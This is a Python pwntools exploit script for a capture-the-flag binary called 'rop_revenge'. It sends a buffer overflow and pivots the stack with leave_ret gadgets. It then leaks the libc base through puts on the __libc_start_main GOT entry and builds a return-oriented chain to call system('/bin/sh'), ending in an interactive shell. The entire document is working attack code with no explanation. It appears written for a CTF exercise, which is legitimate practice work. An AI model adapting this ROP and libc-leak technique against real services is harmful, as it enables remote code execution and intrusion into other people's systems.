#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

e , l = ELF('./rop_revenge') , ELF('./libc.so.6')

host , port = 'ctf.yuawn.idv.tw' , 10109
host , port = '192.168.78.135' , 4000
y = remote( host , port )

name = 0x601080
main = 0x400636
pop_rdi = 0x400743
pop_rbp = 0x4005a0
leave_ret = 0x4006d1


p = flat(
    'D' * 0x1d0,
    main,
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)

y.sendafter( '?' , p )

p = flat(
    'D' * 0x20,
    name + 0x1d0 - 8,
    leave_ret
)

y.sendafter( '?' , p )

y.recvline()
y.recvline()
y.recvline()

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success('libc -> {}'.format( hex(l.address) ))

p = flat(
    pop_rdi,
    l.search( '/bin/sh\x00' ).next(),
    l.symbols['system']
)

#y.sendafter( '?' , p )

p = flat(
    'D' * 0x20,
    name - 8,
    leave_ret
)

#y.sendafter( '?' , p )

#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()